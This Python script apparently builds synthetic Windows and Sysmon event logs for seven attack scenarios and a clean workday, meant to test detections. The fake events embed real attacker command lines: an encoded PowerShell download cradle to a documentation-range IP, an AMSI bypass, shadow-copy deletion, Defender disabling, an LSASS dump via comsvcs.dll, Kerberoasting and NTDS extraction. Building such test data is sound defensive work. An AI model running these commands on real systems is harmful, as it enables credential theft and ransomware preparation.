"""Generate the synthetic attack scenarios in samples/ (Windows event XML, Event Viewer format).

Everything is fake and harmless: the domain is corp.example, internal hosts use 10.0.5.0/24,
"attacker" addresses come from RFC 5737 documentation ranges, and no real malware is involved.
The events follow the real Windows/Sysmon schemas so they exercise the detections realistically.

    python tools/make_samples.py
"""

import base64
from datetime import datetime, timedelta, timezone
from pathlib import Path
from xml.sax.saxutils import escape, quoteattr

OUT = Path(__file__).resolve().parent.parent / "samples"
PROV = {
    "sec": ("Microsoft-Windows-Security-Auditing", "{54849625-5478-4994-a5ba-3e3b0328c30d}", "Security"),
    "sysmon": ("Microsoft-Windows-Sysmon", "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Microsoft-Windows-Sysmon/Operational"),
    "ps": ("Microsoft-Windows-PowerShell", "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "Microsoft-Windows-PowerShell/Operational"),
    "scm": ("Service Control Manager", "{555908d1-a6d7-4695-8e1e-26931d2012f4}", "System"),
    "eventlog": ("Microsoft-Windows-Eventlog", "{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}", "Security"),
    "defender": ("Microsoft-Windows-Windows Defender", "{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}", "Microsoft-Windows-Windows Defender/Operational"),
}


class Log:
    def __init__(self, start):
        self.t = start
        self.rid = 4000
        self.events = []

    def at(self, seconds):
        self.t += timedelta(seconds=seconds)
        return self

    def ev(self, kind, eid, host, data, user_data=None):
        name, guid, channel = PROV[kind]
        self.rid += 1
        ts = self.t.strftime("%Y-%m-%dT%H:%M:%S.") + f"{self.t.microsecond:06d}0Z"
        body = ""
        if user_data:
            tag, fields = user_data
            inner = "".join(f"<{k}>{escape(str(v))}</{k}>" for k, v in fields.items())
            body = f'<UserData><{tag} xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">{inner}</{tag}></UserData>'
        else:
            body = "<EventData>" + "".join(f"<Data Name={quoteattr(k)}>{escape(str(v))}</Data>" for k, v in data.items()) + "</EventData>"
        self.events.append(
            f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
            f'<Provider Name="{name}" Guid="{guid}"/><EventID>{eid}</EventID><Version>0</Version><Level>0</Level>'
            f'<Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="{ts}"/>'
            f'<EventRecordID>{self.rid}</EventRecordID><Correlation/><Execution ProcessID="676" ThreadID="1024"/>'
            f"<Channel>{channel}</Channel><Computer>{host}</Computer><Security/></System>{body}</Event>"
        )
        return self

    def write(self, name):
        OUT.mkdir(exist_ok=True)
        (OUT / name).write_text('<?xml version="1.0" encoding="UTF-8"?>\n<Events>\n' + "\n".join(self.events) + "\n</Events>\n", encoding="utf-8")
        print(f"wrote {name} ({len(self.events)} events)")


def logon(L, host, user, ip, ltype="3", pkg="Kerberos", proc="Kerberos", domain="CORP", key="0", ws="-", sid="S-1-5-21-1004336348-1177238915-682003330-1105"):
    return L.ev("sec", 4624, host, {
        "SubjectUserSid": "S-1-5-18", "SubjectUserName": host.split(".")[0] + "$", "SubjectDomainName": "CORP", "SubjectLogonId": "0x3e7",
        "TargetUserSid": sid, "TargetUserName": user, "TargetDomainName": domain, "TargetLogonId": "0x8a3f2c",
        "LogonType": ltype, "LogonProcessName": proc, "AuthenticationPackageName": pkg, "WorkstationName": ws,
        "LogonGuid": "{00000000-0000-0000-0000-000000000000}", "KeyLength": key, "ProcessId": "0x2c4", "ProcessName": r"C:\Windows\System32\lsass.exe",
        "IpAddress": ip, "IpPort": "49812",
    })


def failed(L, host, user, ip, ltype="10", sub="0xc000006a"):
    return L.ev("sec", 4625, host, {
        "SubjectUserSid": "S-1-0-0", "SubjectUserName": "-", "SubjectDomainName": "-", "TargetUserSid": "S-1-0-0",
        "TargetUserName": user, "TargetDomainName": "", "Status": "0xc000006d", "FailureReason": "%%2313", "SubStatus": sub,
        "LogonType": ltype, "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM", "WorkstationName": "kali",
        "IpAddress": ip, "IpPort": "0",
    })


def proc4688(L, host, user, image, cmd, parent=r"C:\Windows\System32\cmd.exe"):
    return L.ev("sec", 4688, host, {
        "SubjectUserSid": "S-1-5-21-1004336348-1177238915-682003330-500", "SubjectUserName": user, "SubjectDomainName": "CORP",
        "NewProcessId": "0x1a2c", "NewProcessName": image, "TokenElevationType": "%%1936", "ProcessId": "0x11f0",
        "CommandLine": cmd, "ParentProcessName": parent, "MandatoryLabel": "S-1-16-12288",
    })


def sysmon1(L, host, user, image, cmd, parent, parent_cmd=""):
    return L.ev("sysmon", 1, host, {
        "RuleName": "-", "UtcTime": L.t.strftime("%Y-%m-%d %H:%M:%S.000"), "ProcessGuid": "{6a3b1c2d-0000-0000-0000-000000000000}", "ProcessId": "6412",
        "Image": image, "FileVersion": "-", "CommandLine": cmd, "CurrentDirectory": "C:\\Users\\a.ionescu\\", "User": user,
        "IntegrityLevel": "Medium", "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
        "ParentImage": parent, "ParentCommandLine": parent_cmd or parent,
    })


def ps_enc(script):
    return base64.b64encode(script.encode("utf-16-le")).decode()


T0 = datetime(2026, 11, 10, 8, 14, 2, 120000, tzinfo=timezone.utc)

# ---------------------------------------------------------------- 01 RDP brute force → ransomware prep
L = Log(T0)
FS = "FS01.corp.example"
for i in range(46):
    failed(L.at(7 if i else 0), FS, ["administrator", "Administrator", "admin"][i % 3 if i < 40 else 0], "203.0.113.45")
logon(L.at(5), FS, "Administrator", "203.0.113.45", ltype="10", pkg="Negotiate", proc="User32 ", domain="FS01", ws="kali", sid="S-1-5-21-1004336348-1177238915-682003330-500")
L.at(1).ev("sec", 4672, FS, {"SubjectUserSid": "S-1-5-21-1004336348-1177238915-682003330-500", "SubjectUserName": "Administrator", "SubjectDomainName": "FS01", "SubjectLogonId": "0x8a3f2c", "PrivilegeList": "SeDebugPrivilege SeBackupPrivilege SeTakeOwnershipPrivilege"})
for cmd, img in [("whoami /all", "whoami.exe"), ('net group "domain admins" /domain', "net.exe"), ("nltest /dclist:corp.example", "nltest.exe"), ("ipconfig /all", "ipconfig.exe"), ("systeminfo", "systeminfo.exe")]:
    proc4688(L.at(14), FS, "Administrator", rf"C:\Windows\System32\{img}", cmd)
L.at(40).ev("sec", 4720, FS, {"TargetUserName": "support_svc", "TargetDomainName": "FS01", "TargetSid": "S-1-5-21-1004336348-1177238915-682003330-1601", "SubjectUserSid": "S-1-5-21-1004336348-1177238915-682003330-500", "SubjectUserName": "Administrator", "SubjectDomainName": "FS01", "SamAccountName": "support_svc"})
L.at(6).ev("sec", 4732, FS, {"MemberName": "-", "MemberSid": "S-1-5-21-1004336348-1177238915-682003330-1601", "TargetUserName": "Administrators", "TargetDomainName": "Builtin", "TargetSid": "S-1-5-32-544", "SubjectUserSid": "S-1-5-21-1004336348-1177238915-682003330-500", "SubjectUserName": "Administrator", "SubjectDomainName": "FS01"})
proc4688(L.at(30), FS, "Administrator", r"C:\Windows\System32\reg.exe", r"reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f")
proc4688(L.at(20), FS, "Administrator", r"C:\Windows\System32\vssadmin.exe", "vssadmin.exe delete shadows /all /quiet")
proc4688(L.at(3), FS, "Administrator", r"C:\Windows\System32\wbem\WMIC.exe", "wmic shadowcopy delete")
proc4688(L.at(2), FS, "Administrator", r"C:\Windows\System32\bcdedit.exe", "bcdedit /set {default} recoveryenabled no")
L.at(25).ev("eventlog", 1102, FS, {}, user_data=("LogFileCleared", {"SubjectUserSid": "S-1-5-21-1004336348-1177238915-682003330-500", "SubjectUserName": "Administrator", "SubjectDomainName": "FS01", "SubjectLogonId": "0x8a3f2c"}))
L.write("01-rdp-bruteforce-ransomware-prep.xml")

# ---------------------------------------------------------------- 02 Kerberoasting + AS-REP roasting
L = Log(T0 + timedelta(hours=2))
DC = "DC01.corp.example"
for svc in ["krbtgt", "WS07$", "FS01$"]:
    L.at(9).ev("sec", 4769, DC, {"TargetUserName": "a.ionescu@CORP.EXAMPLE", "TargetDomainName": "CORP.EXAMPLE", "ServiceName": svc, "ServiceSid": "S-1-5-21-1004336348-1177238915-682003330-1000", "TicketOptions": "0x40810000", "TicketEncryptionType": "0x12", "IpAddress": "::ffff:10.0.5.23", "IpPort": "50211", "Status": "0x0"})
sysmon1(L.at(20), "WS07.corp.example", r"CORP\a.ionescu", r"C:\Users\Public\Rubeus.exe", r"C:\Users\Public\Rubeus.exe kerberoast /outfile:C:\Users\Public\h.txt /nowrap", r"C:\Windows\System32\cmd.exe")
for svc in ["svc_mssql", "svc_backup", "svc_iis", "svc_sharepoint", "svc_adfs"]:
    L.at(2).ev("sec", 4769, DC, {"TargetUserName": "a.ionescu@CORP.EXAMPLE", "TargetDomainName": "CORP.EXAMPLE", "ServiceName": svc, "ServiceSid": "S-1-5-21-1004336348-1177238915-682003330-1200", "TicketOptions": "0x40810000", "TicketEncryptionType": "0x17", "IpAddress": "::ffff:10.0.5.23", "IpPort": "50233", "Status": "0x0", "TransmittedServices": "-"})
L.at(35).ev("sec", 4768, DC, {"TargetUserName": "svc_legacy_scan", "TargetDomainName": "CORP", "TargetSid": "S-1-5-21-1004336348-1177238915-682003330-1302", "ServiceName": "krbtgt", "TicketOptions": "0x40800010", "Status": "0x0", "TicketEncryptionType": "0x17", "PreAuthType": "0", "IpAddress": "::ffff:10.0.5.23", "IpPort": "50240"})
L.write("02-kerberoasting-asrep-roasting.xml")

# ---------------------------------------------------------------- 03 Phishing macro → PowerShell → Mimikatz / LSASS dump
L = Log(T0 + timedelta(hours=4))
WS = "WS07.corp.example"
U = r"CORP\a.ionescu"
cradle = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/update.ps1')"
sysmon1(L, WS, U, r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", r'"WINWORD.EXE" /n "C:\Users\a.ionescu\Downloads\Invoice_88231.docm"', r"C:\Windows\explorer.exe")
sysmon1(L.at(4), WS, U, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", f"powershell.exe -nop -w hidden -enc {ps_enc(cradle)}", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE")
L.at(1).ev("sysmon", 3, WS, {"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "User": U, "Protocol": "tcp", "SourceIp": "10.0.5.23", "SourcePort": "51544", "DestinationIp": "198.51.100.7", "DestinationHostname": "cdn-update.example", "DestinationPort": "80"})
L.at(2).ev("ps", 4104, WS, {"MessageNumber": "1", "MessageTotal": "1", "ScriptBlockText": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); function Invoke-Mimikatz { <# synthetic sample: no real code #> }; Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'", "ScriptBlockId": "{1d0a8f9e-0000-0000-0000-000000000000}", "Path": ""})
sysmon1(L.at(30), WS, U, r"C:\Windows\System32\rundll32.exe", r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 704 C:\ProgramData\lsass.dmp full", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")
L.at(1).ev("sysmon", 10, WS, {"SourceProcessId": "7120", "SourceImage": r"C:\Windows\System32\rundll32.exe", "TargetProcessId": "704", "TargetImage": r"C:\Windows\System32\lsass.exe", "GrantedAccess": "0x1fffff", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d204|C:\\Windows\\System32\\comsvcs.dll+2b5a1", "SourceUser": U, "TargetUser": r"NT AUTHORITY\SYSTEM"})
L.at(40).ev("sysmon", 13, WS, {"EventType": "SetValue", "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "TargetObject": r"HKU\S-1-5-21-1004336348-1177238915-682003330-1105\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync", "Details": r"C:\Users\Public\onedrivesync.exe", "User": U})
L.at(15).ev("defender", 1116, WS, {"Product Name": "Microsoft Defender Antivirus", "Threat Name": "HackTool:PowerShell/Mimikatz", "Severity Name": "High", "Category Name": "Tool", "Path": r"file:_C:\ProgramData\lsass.dmp", "Detection User": U, "Action Name": "Quarantine"})
L.write("03-phishing-macro-mimikatz-lsass.xml")

# ---------------------------------------------------------------- 04 Pass-the-hash + PsExec lateral movement
L = Log(T0 + timedelta(hours=5))
SRV = "SRV-FILE02.corp.example"
logon(L, WS, "a.ionescu", "::1", ltype="9", pkg="Negotiate", proc="seclogo", ws="WS07")
L.events[-1] = L.events[-1].replace('<Data Name="ProcessName">', '<Data Name="TargetOutboundUserName">admin_jsmith</Data><Data Name="TargetOutboundDomainName">CORP</Data><Data Name="ProcessName">')
logon(L.at(12), SRV, "admin_jsmith", "10.0.5.23", ltype="3", pkg="NTLM", proc="NtLmSsp ", key="0", ws="WS07", sid="S-1-5-21-1004336348-1177238915-682003330-1144")
L.at(1).ev("sec", 5140, SRV, {"SubjectUserSid": "S-1-5-21-1004336348-1177238915-682003330-1144", "SubjectUserName": "admin_jsmith", "SubjectDomainName": "CORP", "ObjectType": "File", "IpAddress": "10.0.5.23", "IpPort": "51770", "ShareName": r"\\*\ADMIN$", "ShareLocalPath": r"\??\C:\Windows"})
L.at(1).ev("sec", 5145, SRV, {"SubjectUserSid": "S-1-5-21-1004336348-1177238915-682003330-1144", "SubjectUserName": "admin_jsmith", "SubjectDomainName": "CORP", "ObjectType": "File", "IpAddress": "10.0.5.23", "IpPort": "51770", "ShareName": r"\\*\ADMIN$", "ShareLocalPath": r"\??\C:\Windows", "RelativeTargetName": "PSEXESVC.exe", "AccessMask": "0x2"})
L.at(1).ev("scm", 7045, SRV, {"ServiceName": "PSEXESVC", "ImagePath": r"%SystemRoot%\PSEXESVC.exe", "ServiceType": "user mode service", "StartType": "demand start", "AccountName": "LocalSystem"})
for cmd in ["whoami", 'net group "domain admins" /domain', "net view", "quser"]:
    proc4688(L.at(9), SRV, "admin_jsmith", rf"C:\Windows\System32\{cmd.split()[0]}.exe", cmd, parent=r"C:\Windows\PSEXESVC.exe")
task_cmd = f"-nop -w hidden -enc {ps_enc(cradle)}"
L.at(20).ev("sec", 4698, SRV, {"SubjectUserSid": "S-1-5-21-1004336348-1177238915-682003330-1144", "SubjectUserName": "admin_jsmith", "SubjectDomainName": "CORP", "TaskName": r"\Microsoft\Windows\UpdateOrchestrator\ScanHealth",
    "TaskContent": f"<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task><Actions Context=\"Author\"><Exec><Command>powershell.exe</Command><Arguments>{task_cmd}</Arguments></Exec></Actions></Task>"})
L.write("04-pass-the-hash-psexec-lateral.xml")

# ---------------------------------------------------------------- 05 DCSync + NTDS theft on the domain controller
L = Log(T0 + timedelta(hours=6))
logon(L, DC, "admin_jsmith", "10.0.5.23", ltype="3", pkg="Kerberos", proc="Kerberos", key="0", ws="-", sid="S-1-5-21-1004336348-1177238915-682003330-1144")
for g in ["1131f6aa-9c07-11d1-f79f-00c04fc2dcd2", "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"]:
    L.at(2).ev("sec", 4662, DC, {"SubjectUserSid": "S-1-5-21-1004336348-1177238915-682003330-1144", "SubjectUserName": "admin_jsmith", "SubjectDomainName": "CORP", "SubjectLogonId": "0x9c1d3a",
        "ObjectServer": "DS", "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}", "ObjectName": "%{2f0bd1c2-0000-0000-0000-000000000000}", "OperationType": "Object Access", "AccessMask": "0x100", "Properties": f"%%7688 {{{g}}} {{19195a5b-6da0-11d0-afd3-00c04fd930c9}}"})
proc4688(L.at(300), DC, "admin_jsmith", r"C:\Windows\System32\ntdsutil.exe", 'ntdsutil "ac i ntds" "ifm" "create full c:\\temp\\x" q q')
proc4688(L.at(60), DC, "admin_jsmith", r"C:\Windows\System32\reg.exe", r"reg save HKLM\SYSTEM c:\temp\x\system.hiv")
L.write("05-dcsync-ntds-theft.xml")

# ---------------------------------------------------------------- 06 Password spraying from the internet
L = Log(T0 + timedelta(days=1))
VPN = "RDGW01.corp.example"
users = ["a.ionescu", "m.popescu", "d.rusu", "i.ciobanu", "v.lungu", "e.munteanu", "s.rotaru", "c.botnaru", "o.cojocaru", "n.sirbu", "t.lupu", "r.ursu"]
for rnd in range(2):
    for u in users:
        failed(L.at(11), VPN, u, "198.51.100.200", ltype="3")
logon(L.at(40), VPN, "m.popescu", "198.51.100.200", ltype="3", pkg="NTLM", proc="NtLmSsp ", key="128", ws="DESKTOP-8H2K", sid="S-1-5-21-1004336348-1177238915-682003330-1188")
L.write("06-password-spraying-internet.xml")

# ---------------------------------------------------------------- 07 A normal workday (control sample: should come back clean)
L = Log(T0 + timedelta(days=2))
W12 = "WS12.corp.example"
logon(L, W12, "e.munteanu", "-", ltype="2", pkg="Negotiate", proc="User32 ", ws="WS12", sid="S-1-5-21-1004336348-1177238915-682003330-1190")
for img, cmd, parent in [
    (r"C:\Program Files\Google\Chrome\Application\chrome.exe", r'"chrome.exe"', r"C:\Windows\explorer.exe"),
    (r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", r'"OUTLOOK.EXE"', r"C:\Windows\explorer.exe"),
    (r"C:\Users\e.munteanu\AppData\Local\Microsoft\Teams\current\Teams.exe", r'"Teams.exe" --system-initiated', r"C:\Windows\explorer.exe"),
    (r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE", r'"EXCEL.EXE" "C:\Users\e.munteanu\Documents\Budget 2027.xlsx"', r"C:\Windows\explorer.exe"),
]:
    sysmon1(L.at(70), W12, r"CORP\e.munteanu", img, cmd, parent)
failed(L.at(1800), W12, "e.munteanu", "-", ltype="7")
logon(L.at(6), W12, "e.munteanu", "-", ltype="7", pkg="Negotiate", proc="User32 ", ws="WS12", sid="S-1-5-21-1004336348-1177238915-682003330-1190")
L.at(1200).ev("sysmon", 3, W12, {"Image": r"C:\Program Files\Google\Chrome\Application\chrome.exe", "User": r"CORP\e.munteanu", "Protocol": "tcp", "SourceIp": "10.0.5.40", "SourcePort": "52011", "DestinationIp": "203.0.113.80", "DestinationHostname": "intranet-cdn.example", "DestinationPort": "443"})
L.at(5400).ev("sec", 4634, W12, {"TargetUserSid": "S-1-5-21-1004336348-1177238915-682003330-1190", "TargetUserName": "e.munteanu", "TargetDomainName": "CORP", "TargetLogonId": "0x8a3f2c", "LogonType": "2"})
L.write("07-normal-workday-clean.xml")
